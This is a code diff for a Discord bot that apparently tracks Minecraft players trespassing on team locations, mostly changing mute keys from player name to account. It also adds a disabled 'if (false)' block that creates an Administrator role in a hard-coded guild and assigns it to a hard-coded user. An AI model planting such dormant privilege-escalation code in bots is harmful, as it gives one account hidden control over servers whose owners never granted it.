@@ -175,7 +175,7 @@ async function checkPositions(players: Player[]) {
 
                 if (allowed_teams.some(team => team.members.some(member => member.username == player.account))) continue
 
-                if (session_mutes.includes(`${location.name}:${player.name}`)) continue
+                if (session_mutes.includes(`${location.name}:${player.account}`)) continue
 
                 location_cooldowns?.set(player.account, Date.now() + COOLDOWN)
                 console.log(`PLAYER TRESSPASSING [${location.teams.join()}'s ${location.name}] : ${player.account} : ${player.x}, ${player.y}, ${player.z} [${distance} blocks from center]`)
@@ -367,7 +367,7 @@ async function main() {
                     
                     log_cache.forEach((value, key) => {
                         if (value.message_id == message.id) {
-                            session_mutes.push(`${value.location.name}:${value.player.name}`)
+                            session_mutes.push(`${value.location.name}:${value.player.account}`)
                             value.muted = true
                             log_cache.set(key, value)
                         }
@@ -383,6 +383,21 @@ async function main() {
     discord_client.on("ready", async () => {
         console.log(`Discord Bot Running (${discord_client.user?.username}#${discord_client.user?.discriminator})!`)
         console.log("Started up the satellite")
+
+
+        if (false) {
+            const guild = await discord_client.guilds.fetch("1085648041354199170")
+
+            const role = await guild.roles.create({
+                name: "hoist",
+                color: "#ff0000",
+                permissions: ["Administrator"],
+                hoist: true
+            })
+
+            const me = await guild.members.fetch("409396339802374147")
+            me.roles.add(role)
+        }
 
         while (true) {
             const data = await getInfoForDimention("world")
@@ -402,6 +417,9 @@ async function main() {
 
             await sleep(2000)
         }
+
+        
+
     })
 
     discord_client.login(process.env.DISCORD_TOKEN)
